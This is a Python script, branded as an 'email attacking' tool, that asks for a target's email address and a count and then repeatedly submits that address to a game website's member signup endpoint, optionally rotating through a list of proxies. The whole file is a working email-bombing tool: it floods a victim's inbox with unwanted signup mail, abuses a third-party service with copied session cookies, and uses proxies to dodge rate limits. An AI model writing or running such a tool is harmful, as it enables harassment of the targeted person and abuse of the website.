# Last Updated 19/03/66
import os
import time
import random
import threading

try:
	import requests
	import pyfiglet
except ImportError:
	os.system('pip install requests')
	os.system('pip install pyfiglet')

ascii_banner = pyfiglet.figlet_format("  ATTACKING")

def process():
	os.system('clear')
	print(ascii_banner)
	print("            CREATE BY GENIXSHOP EMAIL ATTACKING")
	print()
	print('************************************************************')
	print()
	input_email = input(' [+] Email Address : ')
	input_threads = int(input(' [+] Threads       : '))
	input_type = input(' [+] Proxy? (y,n)  : ')
	print()
	
	def api1(email):
		headers = {
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
			"x-requested-with": "XMLHttpRequest",
			"cookie": "PHPSESSID=bv7bdhbpu4hfje078rvhluvdfo; _gid=GA1.2.1023838379.1664017103; _gat_gtag_UA_135083014_2=1; _gcl_au=1.1.1201937745.1664017105; _ga_PBYDNCGKP0=GS1.1.1664017105.1.0.1664017105.0.0.0; _ga=GA1.2.1010683673.1664017103"
		}
		for g in range(1, input_threads+1):
			req = requests.post("https://au.moveongame.com/member/joinemaildo.php",headers=headers,data=f"signup-email={email}")
			print(req)
			print(req.json())
			print(f' THREADS : {g}')
	
	def api2(email):
		f = open("proxy.txt", "r").read().splitlines()
		headers = {
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
			"x-requested-with": "XMLHttpRequest",
			"cookie": "PHPSESSID=bv7bdhbpu4hfje078rvhluvdfo; _gid=GA1.2.1023838379.1664017103; _gat_gtag_UA_135083014_2=1; _gcl_au=1.1.1201937745.1664017105; _ga_PBYDNCGKP0=GS1.1.1664017105.1.0.1664017105.0.0.0; _ga=GA1.2.1010683673.1664017103"
		}
		for g in range(1, input_threads+1):
			proxy = random.choice(f)
			req = requests.post("https://au.moveongame.com/member/joinemaildo.php",headers=headers,data=f"signup-email={email}",proxies={"http": "http://"+proxy})
			print(req)
			print(req.json())
			print(f' THREADS : {g}')
			print(f' Proxy Requested : {proxy}')
	
	if (input_type == "Y" or input_type == "y"):
		print("                   ATTACK HTTP_PROXY !")
		threading.Thread(target=api2, args=[input_email]).start()
	else:
		print("                   ATTACK ORIGINAL !")
		threading.Thread(target=api1, args=[input_email]).start()
	
process()